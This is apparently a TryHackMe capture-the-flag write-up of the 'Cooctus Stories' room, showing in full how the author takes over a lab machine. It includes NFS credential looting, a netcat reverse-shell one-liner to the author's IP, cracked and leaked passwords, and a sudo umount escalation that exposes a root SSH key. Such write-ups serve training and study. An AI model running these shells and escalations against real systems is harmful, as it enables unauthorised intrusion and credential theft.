# 54 - Cooctus Stories (C, umount exploitation)

Room Link --> [https://tryhackme.com/room/cooctusadventures](https://tryhackme.com/room/cooctusadventures)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ nmap -Pn -n -v 10.10.231.155 -p- -sV -T5

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs_acl  3 (RPC #100227)
8080/tcp  open  http     Werkzeug httpd 0.14.1 (Python 3.6.9)
37423/tcp open  nlockmgr 1-4 (RPC #100021)
38385/tcp open  mountd   1-3 (RPC #100005)
44055/tcp open  mountd   1-3 (RPC #100005)
45843/tcp open  mountd   1-3 (RPC #100005)
```
{% endcode %}

#### NFS enumeration

```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ showmount -e 10.10.231.155   
Export list for 10.10.231.155:
/var/nfs/general *
```

Mounting the Share:

{% code overflow="wrap" %}
```bash
┌──(root㉿dking)-[~]
└─# mount -t nfs 10.10.231.155:/var/nfs/general /mnt/root -o nolock

┌──(root㉿dking)-[~]
└─# cd /mnt/root && ls -al
total 12
drwxr-xr-x 2 nobody nogroup 4096 Nov 21  2020 .
drwxr-xr-x 3 root   root    4096 Nov  3 17:35 ..
-rw-r--r-- 1 root   root      31 Nov 21  2020 credentials.bak
                                                                                                                
┌──(root㉿dking)-[/mnt/root]
└─# cat credentials.bak        
paradoxial.test
ShibaPretzel79

# unmounting the share.
┌──(root㉿dking)-[/mnt/root]
└─# umount -f -l /mnt/root

# we got a credential.
```
{% endcode %}

#### Gobuster Enumeration                                                                                                               &#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ gobuster dir -u http://10.10.231.155:8080/ -w /usr/share/dirb/wordlists/common.txt -t 500 --no-error

/cat
/login
```
{% endcode %}

Navigating to the `/login` dir and using the creds we found to login:

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The page seems to be outputing any thing i send to it.

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Checking to see if the machine can reach me.

```bash
# setup tcpdump on kali and wait.
 sudo tcpdump -i tun0 icmp

# then run ping on the website.
```

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So there is RCE, we can try to get Reverse shell.

{% code overflow="wrap" %}
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.88.214 9000 >/tmp/f
```
{% endcode %}

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We are `Paradox` user.

### Priv Esc to Szymex user

`/etc/crontab` - there is a job owned by `szymex` running every minute. `/home/szymex/SniffingCat.py` .

INside the Home dir of `szymex` user, there is a note for Paradox user.

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Reading through the script we can see it reads something from the file mysupersecretpassword.txt, runs it through a function to encode it, and checks if it matches enc\_pw which should be pureelpbxr. The encoding function uses the number 13 a couple of times, so I’m thinking is it rot13 encoded. I tried pasting it in Google and got this as first hit:

![cooctus-rot13](https://pencer.io/assets/images/2021-04-19-22-17-38.png)

Worth a try, so I found [this](https://cryptii.com/pipes/rot13-decoder) decoder and pasted it in:

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We switch into `szymex` account with the password `cherrycoke` and it worked.

<figure><img src=".gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to Tux

Szymex is part of the `testers` group, so inside `Tox` home dir, &#x20;

I have a look in the other users home folders, in tux I see this:

```bash
szymex@cchq:/home/tux$ ls -l
total 16
-rw-rw-r-- 1 tux tux      630 Jan  2 19:05 note_to_every_cooctus
drwxrwx--- 2 tux testers 4096 Feb 20 16:28 tuxling_1
drwxrwx--- 2 tux testers 4096 Feb 20 21:02 tuxling_3
-rw------- 1 tux tux       38 Feb 20 21:05 user.txt
```

First let’s look at the note as we have permissions to read:

{% code overflow="wrap" %}
```
szymex@cchq:/home/tux$ cat note_to_every_cooctus 
Hello fellow Cooctus Clan members

I'm proposing my idea to dedicate a portion of the cooctus fund for the construction of a penguin army.

The 1st Tuxling Infantry will provide young and brave penguins with opportunities to
explore the world while making sure our control over every continent spreads accordingly.

Potential candidates will be chosen from a select few who successfully complete all 3 Tuxling Trials.
Work on the challenges is already underway thanks to the trio of my top-most explorers.

Required budget: 2,348,123 Doge coins and 47 pennies.

Hope this message finds all of you well and spiky.

- TuxTheXplorer
```
{% endcode %}

It mentions 3 tuxling trials. It looks like we have two of them here called tuxling\_1 and tuxling\_3, I’m assuming there’s another somewhere so search for it:

```bash
szymex@cchq:/home/tux$ find / -type d -name tuxling_2 2>/dev/null 
/media/tuxling_2
szymex@cchq:/home/tux$ 
```

Ok so that one was hidden in the /media folder. Let’s have a look at the first one:

{% code overflow="wrap" %}
```bash
szymex@cchq:/home/tux/tuxling_1$ cat note
Noot noot! You found me.
I'm Mr. Skipper and this is my challenge for you.

General Tux has bestowed the first fragment of his secret key to me.
If you crack my NootCode you get a point on the Tuxling leaderboards and you'll find my key fragment.

Good luck and keep on nooting!

PS: You can compile the source code with gcc
```
{% endcode %}

Looking at the nootcode.c file:

{% code overflow="wrap" lineNumbers="true" %}
```c
szymex@cchq:/home/tux/tuxling_1$ cat nootcode.c 
#include <stdio.h>

#define noot int
#define Noot main
#define nOot return
#define noOt (
#define nooT )
#define NOOOT "f96"
#define NooT ;
#define Nooot nuut
#define NOot {
#define nooot key
#define NoOt }
#define NOOt void
#define NOOT "NOOT!\n"
#define nooOT "050a"
#define noOT printf
#define nOOT 0
#define nOoOoT "What does the penguin say?\n"
#define nout "d61"

noot Noot noOt nooT NOot
    noOT noOt nOoOoT nooT NooT
    Nooot noOt nooT NooT

    nOot nOOT NooT
NoOt

NOOt nooot noOt nooT NOot
    noOT noOt NOOOT nooOT nout nooT NooT
NoOt

NOOt Nooot noOt nooT NOot
    noOT noOt NOOT nooT NooT
NoOt
```
{% endcode %}

At first this appears weird, but if you look closely you can see the section under the #define part is simply a search and replace for each word from the list above it. The decoded code looks like this:

{% code overflow="wrap" lineNumbers="true" %}
```c
#include <stdio.h>

int main (){
    printf ( "What does the penguin say?") ;
    nuut() ;
    // I added this coded before return 0
    printf("\n\n key:- \t");
    key();
    printf("\n\n");
    return 0 ;
}

void key() {
    printf("f96" "050a" "d61");
}

void nuut (){
    printf("NOOT!") ;
}
```
{% endcode %}

This gives us the key for part 1. On to part 2:

```bash
szymex@cchq:/home/tux/tuxling_1$ cd /media/tuxling_2/
szymex@cchq:/media/tuxling_2$ ls -l
total 12
-rw-rw-r-- 1 tux testers  740 Feb 20 20:00 fragment.asc
-rw-rw---- 1 tux testers  280 Jan  2 20:20 note
-rw-rw-r-- 1 tux testers 3670 Feb 20 20:01 private.key

szymex@cchq:/media/tuxling_2$ cat note 
Noot noot! You found me. 
I'm Rico and this is my challenge for you.

General Tux handed me a fragment of his secret key for safekeeping.
I've encrypted it with Penguin Grade Protection (PGP).

You can have the key fragment if you can decrypt it.

Good luck and keep on nooting!
```

This one is nice and simple. We can just import the key and then decrypt:

{% code overflow="wrap" %}
```bash
szymex@cchq:/media/tuxling_2$ gpg --import private.key 
gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported
gpg: key B70EB31F8EF3187C: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
szymex@cchq:/media/tuxling_2$ gpg --decrypt fragment.asc 
gpg: Note: secret key 97D48EB17511A6FA expired at Mon 20 Feb 2023 07:58:30 PM UTC
gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
      "TuxPingu"
The second key fragment is: 6eaf62818d
szymex@cchq:/media/tuxling_2$ 
```
{% endcode %}

On to the 3rd key.

```bash
szymex@cchq:/home/tux/tuxling_3$ ls -al
total 12
drwxrwx--- 2 tux testers 4096 Feb 20  2021 .
drwxr-xr-x 9 tux tux     4096 Feb 20  2021 ..
-rwxrwx--- 1 tux testers  178 Feb 20  2021 note
szymex@cchq:/home/tux/tuxling_3$ cat note 
Hi! Kowalski here. 
I was practicing my act of disappearance so good job finding me.

Here take this,
The last fragment is: 637b56db1552

Combine them all and visit the station.
```

We got all 3 fragments of the key.

```bash
f96050ad616eaf62818d637b56db1552

# cracking it with john
┌──(dking㉿dking)-[~/Downloads]
└─$ john passwd --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5   
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
tuxykitty        (?)
```

And we can su into Tux account.

### Priv Esc to Varg

Now we move on to varg:

```bash
tux@cchq:~$ cd /home/varg/
tuxg@cchq:~$ ls -l
-rwsrws--x  1 varg varg      2146 Feb 20 22:05 CooctOS.py
drwxrwx--- 11 varg os_tester 4096 Feb 20 15:44 cooctOS_src
-rw-------  1 varg varg        38 Feb 20 21:08 user.txt
```

Hmm, what is that source folder:

```bash
tux@cchq:/home/varg$ cd cooctOS_src/
tuxg@cchq:/home/varg/cooctOS_src$ ls -la
drwxrwx--- 11 varg os_tester 4096 Feb 20 15:44 .
drwxr-xr-x  7 varg varg      4096 Feb 20 22:06 ..
drwxrwx---  2 varg os_tester 4096 Feb 20 15:46 bin
drwxrwx---  4 varg os_tester 4096 Feb 20 15:22 boot
drwxrwx---  2 varg os_tester 4096 Feb 20 15:10 etc
drwxrwx---  2 varg os_tester 4096 Feb 20 15:41 games
drwxrwxr-x  8 varg os_tester 4096 Feb 20 15:47 .git
drwxrwx---  3 varg os_tester 4096 Feb 20 14:44 lib
drwxrwx--- 16 varg os_tester 4096 Feb 20 15:21 run
drwxrwx---  2 varg os_tester 4096 Feb 20 09:11 tmp
drwxrwx--- 11 varg os_tester 4096 Feb 20 15:20 var
```

A hidden .git folder, let’s look in there:

```bash
tux@cchq:/home/varg/cooctOS_src$ cd .git/
tux@cchq:/home/varg/cooctOS_src/.git$ ls -l
drwxrwxr-x  2 varg os_tester 4096 Feb 20 15:44 branches
-rw-rw-r--  1 varg os_tester   37 Feb 20 15:47 COMMIT_EDITMSG
-rw-rw-r--  1 varg os_tester   92 Feb 20 15:44 config
-rw-rw-r--  1 varg os_tester   73 Feb 20 15:44 description
-rw-rw-r--  1 varg os_tester   23 Feb 20 15:44 HEAD
drwxrwxr-x  2 varg os_tester 4096 Feb 20 15:44 hooks
-rw-rw-r--  1 varg os_tester  825 Feb 20 15:47 index
drwxrwxr-x  2 varg os_tester 4096 Feb 20 15:44 info
drwxrwxr-x  3 varg os_tester 4096 Feb 20 15:46 logs
drwxrwxr-x 17 varg os_tester 4096 Feb 20 15:47 objects
drwxrwxr-x  4 varg os_tester 4096 Feb 20 15:44 refs
```

We have a git repo, we can use **git show** to have a look at the last commit:

```bash
tux@cchq:/home/varg/cooctOS_src/.git$ git show
commit 8b8daa41120535c569d0b99c6859a1699227d086 (HEAD -> master)
Author: Vargles <varg@cchq.noot>
Date:   Sat Feb 20 15:47:21 2021 +0000

    Removed CooctOS login script for now

diff --git a/bin/CooctOS.py b/bin/CooctOS.py
deleted file mode 100755
index 4ccfcc1..0000000
--- a/bin/CooctOS.py
+++ /dev/null
@@ -1,52 +0,0 @@
-#!/usr/bin/python3
-
-import time
-import os;
-import pty;
-
-#print(chr(27)+ "[2J")
-logo = """\033[1;30;49m
- ██████╗ ██████╗  ██████╗  ██████╗████████╗ \033[1;37;49m██████╗ ███████╗\033[1;30;49m
-██╔════╝██╔═══██╗██╔═══██╗██╔════╝╚══██╔══╝\033[1;37;49m██╔═══██╗██╔════╝\033[1;30;49m
-██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║███████╗\033[1;30;49m
-██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║╚════██║\033[1;30;49m
-╚██████╗╚██████╔╝╚██████╔╝╚██████╗   ██║   \033[1;37;49m╚██████╔╝███████║\033[1;30;49m
- ╚═════╝ ╚═════╝  ╚═════╝  ╚═════╝   ╚═╝    \033[1;37;49m╚═════╝ ╚══════╝\033[1;30;49m
-"""
-print(logo)
-print("                       LOADING")
-print("[", end='')
-
-for i in range(0,60):
-    #print(chr(27)+ "[2J")
-    #print(logo)
-    #print("                       LOADING")
-    print("[", end='')
-    print("=" * i, end='')
-    print("]")
-    time.sleep(0.02)
-    print("\033[A\033[A")
-
-print("\032")
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Cold boot detected. Flux Capacitor powered up")
-
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Mounted Cooctus Filesystem under /opt")
-
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Finished booting sequence")
-
-print("CooctOS 13.3.7 LTS cookie tty1")
-uname = input("\ncookie login: ")
-pw = input("Password: ")
-
-for i in range(0,2):
-    if pw != "slowroastpork":
-        pw = input("Password: ")
-    else:
-        if uname == "varg":
-            os.setuid(1002)
-            os.setgid(1002)
-            pty.spawn("/bin/rbash")
-            break
-        else:
-            print("Login Failed")
-            break
```

We see there’s a password mentioned in the source code, could this be for varg:

`varg : slowroastpork`&#x20;

```bash
tux@cchq:/home/varg/cooctOS_src/.git$ su varg
Password: 
varg@cchq:~/cooctOS_src/.git$ 
```

### Priv Esc to Root

&#x20;`sudo -l` .

```bash
varg@cchq:~$ sudo -l
Matching Defaults entries for varg on cchq:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User varg may run the following commands on cchq:
    (root) NOPASSWD: /bin/umount
```

There is no reason for this user to have that unless it’s our intended path.

It had me puzzled for a while, but I found [this](https://linoxide.com/list-mounted-drives-on-linux/) really interesting article. It shows lots of ways to find mounted volumes. First I listed them all:

```bash
varg@cchq:~$ findmnt
TARGET                                SOURCE                                                    FSTYPE      OPTIONS
/                                     /dev/mapper/ubuntu--vg-ubuntu--lv                         ext4        rw,relatime,data=ordered
├─/sys                                sysfs                                                     sysfs       rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/security              securityfs                                                securityfs  rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/cgroup                    tmpfs                                                     tmpfs       ro,nosuid,nodev,noexec,mode=755
│ │ ├─/sys/fs/cgroup/unified          cgroup                                                    cgroup2     rw,nosuid,nodev,noexec,relatime,nsdelegate
│ │ ├─/sys/fs/cgroup/systemd          cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,xattr,name=systemd
│ │ ├─/sys/fs/cgroup/memory           cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,memory
│ │ ├─/sys/fs/cgroup/cpu,cpuacct      cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,cpu,cpuacct
│ │ ├─/sys/fs/cgroup/pids             cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,pids
│ │ ├─/sys/fs/cgroup/hugetlb          cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,hugetlb
│ │ ├─/sys/fs/cgroup/net_cls,net_prio cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,net_cls,net_prio
│ │ ├─/sys/fs/cgroup/devices          cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,devices
│ │ ├─/sys/fs/cgroup/blkio            cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,blkio
│ │ ├─/sys/fs/cgroup/freezer          cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,freezer
│ │ ├─/sys/fs/cgroup/cpuset           cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,cpuset
│ │ ├─/sys/fs/cgroup/rdma             cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,rdma
│ │ └─/sys/fs/cgroup/perf_event       cgroup                                                    cgroup      rw,nosuid,nodev,noexec,relatime,perf_event
│ ├─/sys/fs/pstore                    pstore                                                    pstore      rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/debug                 debugfs                                                   debugfs     rw,relatime
│ ├─/sys/kernel/config                configfs                                                  configfs    rw,relatime
│ └─/sys/fs/fuse/connections          fusectl                                                   fusectl     rw,relatime
├─/proc                               proc                                                      proc        rw,nosuid,nodev,noexec,relatime
│ ├─/proc/sys/fs/binfmt_misc          systemd-1                                                 autofs      rw,relatime,fd=26,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=14925
│ │ └─/proc/sys/fs/binfmt_misc        binfmt_misc                                               binfmt_misc rw,relatime
│ └─/proc/fs/nfsd                     nfsd                                                      nfsd        rw,relatime
├─/dev                                udev                                                      devtmpfs    rw,nosuid,relatime,size=213660k,nr_inodes=53415,mode=755
│ ├─/dev/pts                          devpts                                                    devpts      rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000
│ ├─/dev/shm                          tmpfs                                                     tmpfs       rw,nosuid,nodev
│ ├─/dev/hugepages                    hugetlbfs                                                 hugetlbfs   rw,relatime,pagesize=2M
│ └─/dev/mqueue                       mqueue                                                    mqueue      rw,relatime
├─/run                                tmpfs                                                     tmpfs       rw,nosuid,noexec,relatime,size=49072k,mode=755
│ ├─/run/lock                         tmpfs                                                     tmpfs       rw,nosuid,nodev,noexec,relatime,size=5120k
│ ├─/run/rpc_pipefs                   sunrpc                                                    rpc_pipefs  rw,relatime
│ └─/run/user/1002                    tmpfs                                                     tmpfs       rw,nosuid,nodev,relatime,size=49068k,mode=700,uid=1002,gid=1002
├─/opt/CooctFS                        /dev/mapper/ubuntu--vg-ubuntu--lv[/home/varg/cooctOS_src] ext4        rw,relatime,data=ordered
└─/boot                               /dev/xvda2                                                ext4        rw,relatime,data=ordered
varg@cchq:~$ 
```

I wondered why /opt/CoocFS is mounted and not just a folder. So tried it with -s:

```bash
varg@cchq:~$ findmnt -s
TARGET       SOURCE                                                                                       FSTYPE OPTIONS
/            /dev/disk/by-id/dm-uuid-LVM-mrAx163lW73D8hFDlydZU2zYDwkd7tgT28ehcZQNMmzJmc0XKYP9m3eluIT1sZGo ext4   defaults
/boot        /dev/disk/by-uuid/6885d03d-f1fb-4785-971e-2bb17a3d22e3                                       ext4   defaults
/opt/CooctFS /home/varg/cooctOS_src                                                                       none   defaults,bind
```

Interesting. I wonder if that’s the target we are supposed to unmount? Let’s try:

```bash
varg@cchq:~$ ls /opt/CooctFS/
bin  boot  etc  games  lib  run  tmp  var

varg@cchq:~$ sudo /bin/umount /opt/CooctFS

varg@cchq:~$ ls /opt/CooctFS/
root
```

Clever. The CooctFS mount was hiding the root folder that was already inside. Let’s have a look:

```
varg@cchq:~$ ls -la /opt/CooctFS/root
drwxr-xr-x 5 root root 4096 Feb 20 09:16 .
drwxr-xr-x 3 root root 4096 Feb 20 09:09 ..
lrwxrwxrwx 1 root root    9 Feb 20 09:15 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Feb 20 09:09 .bashrc
drwx------ 3 root root 4096 Feb 20 09:09 .cache
drwxr-xr-x 3 root root 4096 Feb 20 09:09 .local
-rw-r--r-- 1 root root   43 Feb 20 09:16 root.txt
drwxr-xr-x 2 root root 4096 Feb 20 09:41 .ssh
```

We found the root flag:

```
varg@cchq:~$ cat /opt/CooctFS/root/root.txt
hmmm...
No flag here. You aren't root yet.
```

Ah, tricked us! However there’s a .ssh folder, so we can probably just copy the id\_rsa key to Kali then use it to log in as root:

```
varg@cchq:~$ cat /opt/CooctFS/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAx2+vTyYoQxGMHh/CddrGqllxbhNo3P4rPNqQiWkTPFnxxNv6
5vqc2vl5vd3ZPcOHp3w1pIF3MH6kgY3JicvfHVc3phWukXuw2UunYtBVNSaj6hKn
DwIWH3xCnWBqG6BR4dI3woQwOWQ6e5wcKlYz/mqmQIUKqvY5H3fA8HVghu7ARSre
Jz2sMB4GzqER8/G9ESan7UOtrarhvHtC+l5g2QIDAQABAoIBAC9qKRa7LqVLXbGn
<SNIP>
9ejKB+8SSAFrerw4YeNaF430jouhcNKdvdQHAHmxvKNI6dk8wwbm6ur14BgJpb9n
0NFYJEzcf2mhdsBbr5aAL3kD9Dwfq9Le2StO092i0WsjrAPO3Lwj9isFspiFltAF
gEaHHwKBgQDQQ3tLEWwGbULkIXiKopgN/6ySp23TVFHKK8D8ZXzRgxiroBkG129t
FXhWaDVCDTHczV1Ap3jKn1UKFHdhsayK34EAvRiTc+onpkrOMEkK6ky9nSGWSWbr
knJ1V6wrLgd2qPq2r5g0a/Qk2fL0toxFbnsQRsueVfPwCQWTjSo/Wg==
-----END RSA PRIVATE KEY-----
```

Paste the above in to a new file on Kali. Change permissions:

```
┌──(root💀kali)-[~/thm/cooctus]
└─# chmod 600 id_rsa
```

Now let’s try it:

```
┌──(root💀kali)-[~/thm/cooctus]
└─# ssh root@cooctus.thm -i id_rsa
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)

  System information as of Tue Apr 20 21:14:39 UTC 2021

  System load:  0.08               Processes:           106
  Usage of /:   35.0% of 18.57GB   Users logged in:     0
  Memory usage: 34%                IP address for eth0: 10.10.139.176
  Swap usage:   0%

Last login: Sat Feb 20 22:22:12 2021 from 172.16.228.162
root@cchq:~# 
```

We’re in as root at last. Let’s get the last flag and we’re finished:

